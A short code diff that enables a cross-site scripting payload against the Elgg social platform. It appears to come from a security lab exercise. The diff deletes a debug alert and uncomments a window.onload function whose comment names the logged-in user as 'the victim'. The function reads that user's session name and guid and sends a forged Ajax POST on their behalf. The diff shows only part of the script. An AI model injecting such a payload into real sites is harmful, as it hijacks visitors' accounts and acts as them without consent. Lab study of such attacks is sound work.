@@ -1,5 +1,4 @@
-alert('here');
-/*window.onload = function(){
+window.onload = function(){
   // get the name and guid of the victim (we don't want to change those)
   var userName="&name="+elgg.session.user.name;
   var guid="&guid="+elgg.session.user.guid;
@@ -23,4 +22,4 @@ alert('here');
     Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     Ajax.send(content);
   }
-}*/
+}
